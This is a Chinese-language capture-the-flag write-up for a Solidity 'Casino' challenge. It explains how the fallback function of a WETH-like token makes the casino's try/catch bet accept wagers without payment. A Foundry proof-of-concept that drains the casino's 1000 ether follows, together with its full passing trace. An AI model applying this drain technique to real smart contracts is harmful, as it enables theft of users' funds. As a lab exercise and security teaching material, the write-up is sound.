## Casino

主要是两个合约 `Casino` 和 `WrappedNative`，`WNative` 类似 WETH，是赌场下注和最终赚取的代币。

但是，下注之前需要把 `WNative` 代币转换成赌场专用的筹码 `cToken`。但这步不是必须的，如果你使用 `WNative` 直接下注，合约会贴心的把 `WNative` 转换成筹码 `cToken` 再下注。

赌场合约 `Casino` 起初有 1000 ether 的 `WNative`，而你只有 1 wei 的 `WNative`，你需要清空赌场。

下注通过 `play` 函数：
``` solidity
    function play(address token, uint256 amount) public checkPlay {
        _bet(token, amount);
        CasinoToken cToken = isCToken(token) ? CasinoToken(token) : CasinoToken(_tokenMap[token]);
        // play

        cToken.get(msg.sender, amount * slot());
    }

    function _bet(address token, uint256 amount) internal {
        require(isAllowed(token), "Token not allowed");
        CasinoToken cToken = CasinoToken(token);
        try cToken.bet(msg.sender, amount) {}
        catch {
            cToken = CasinoToken(_tokenMap[token]);
            deposit(token, amount);
            cToken.bet(msg.sender, amount);
        }
    }
```

其中 `_bet` 函数就是用来做转换用的，设想的是，如果你使用 `WNative` 代币进行下注，那么调用该代币的 `bet` 方法，会抛出错误，于是再转换成 `cToken` 再调用 `cToken` 的 `bet` 方法下注。

看起来似乎没什么问题，问题在于 `WNative` 代币有 `fallback` 方法。

``` solidity
contract WrappedNative is ERC20("Wrapped Native Token", "WNative"), Ownable {
    using Address for address payable;

    fallback() external payable {
        deposit();
    }

    function mint(address receiver, uint256 amount) external onlyOwner {
        _mint(receiver, amount);
    }

    function deposit() public payable {
        _mint(msg.sender, msg.value);
    }

    function withdraw(uint256 amount) external {
        _burn(msg.sender, amount);
        payable(msg.sender).sendValue(amount);
    }
}
```

那么在使用 `WNative` 代币进行下注的时候，并不会抛出错误，而是调用了 `WNative` 代币的 `deposit` 方法，把 0 个 `WNative` 代币 `mint` 给了我们。此后，继续执行赌场游戏，如果获奖了，把 `cToken` 转出。整个过程，没有真正把筹码和代币转入到赌场合约中。

## 题解
1. 在每一块中不断获取 `casino.slot()`，当 `casino.slot()` 大于 0 时下注。
2. 使用 `WNative` 代币进行大金额下注。
3. 会获取 1000 ether 的 `cToken`，我们把它换成 `WNative` 代币。

POC:
``` solidity
    function testExploit() public {
        uint256 blockNum = block.number;
        vm.startPrank(you);

        // simulate playing the slot in upcoming blocks
        do {
            vm.roll(blockNum++);
        } while (casino.slot() == 0);

        // play with wNative
        casino.play(wNative, uint256(1e21) / 3 + 1);
        casino.withdraw(wNative, 1_000e18);

        // solve
        base.solve();
        assertTrue(base.isSolved());
        vm.stopPrank();
    }
```

```
[PASS] testExploit() (gas: 1040565152)
Traces:
  [1040569952] CasinoTest::testExploit()
    ├─ [0] VM::startPrank(you: [0xdD8e94483FCf48AE29C652d9db4023404E5Bf815])
    │   └─ ← [Return] 
    ├─ [0] VM::roll(1)
    │   └─ ← [Return] 
    ├─ [651] Casino::slot() [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::roll(2)
    │   └─ ← [Return] 
    ├─ [651] Casino::slot() [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::roll(3)
    │   └─ ← [Return] 
    ├─ [651] Casino::slot() [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::roll(4)
    │   └─ ← [Return] 
    ├─ [627] Casino::slot() [staticcall]
    │   └─ ← [Return] 3
    ├─ [1040464017] Casino::play(WrappedNative: [0x104fBc016F4bb334D775a19E8A6510109AC63E00], 333333333333333333334 [3.333e20])
    │   ├─ [6717] WrappedNative::bet(you: [0xdD8e94483FCf48AE29C652d9db4023404E5Bf815], 333333333333333333334 [3.333e20])
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: Casino: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3], value: 0)
    │   │   └─ ← [Stop] 
    │   ├─ [461] WrappedNative::underlying() [staticcall]
    │   │   └─ ← [StateChangeDuringStaticCall] EvmError: StateChangeDuringStaticCall
    │   ├─ [48813] CasinoToken::get(you: [0xdD8e94483FCf48AE29C652d9db4023404E5Bf815], 1000000000000000000002 [1e21])
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: you: [0xdD8e94483FCf48AE29C652d9db4023404E5Bf815], value: 1000000000000000000002 [1e21])
    │   │   └─ ← [Stop] 
    │   └─ ← [Stop] 
    ├─ [54954] Casino::withdraw(WrappedNative: [0x104fBc016F4bb334D775a19E8A6510109AC63E00], 1000000000000000000000 [1e21])
    │   ├─ [3190] CasinoToken::withdrawTo(you: [0xdD8e94483FCf48AE29C652d9db4023404E5Bf815], 1000000000000000000000 [1e21])
    │   │   ├─ emit Transfer(from: you: [0xdD8e94483FCf48AE29C652d9db4023404E5Bf815], to: 0x0000000000000000000000000000000000000000, value: 1000000000000000000000 [1e21])
    │   │   └─ ← [Return] true
    │   ├─ [27794] WrappedNative::transfer(you: [0xdD8e94483FCf48AE29C652d9db4023404E5Bf815], 1000000000000000000000 [1e21])
    │   │   ├─ emit Transfer(from: Casino: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3], to: you: [0xdD8e94483FCf48AE29C652d9db4023404E5Bf815], value: 1000000000000000000000 [1e21])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [25369] CasinoBase::solve()
    │   ├─ [563] WrappedNative::balanceOf(Casino: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3]) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop] 
    ├─ [309] CasinoBase::isSolved() [staticcall]
    │   └─ ← [Return] true
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return] 
    └─ ← [Stop] 
```



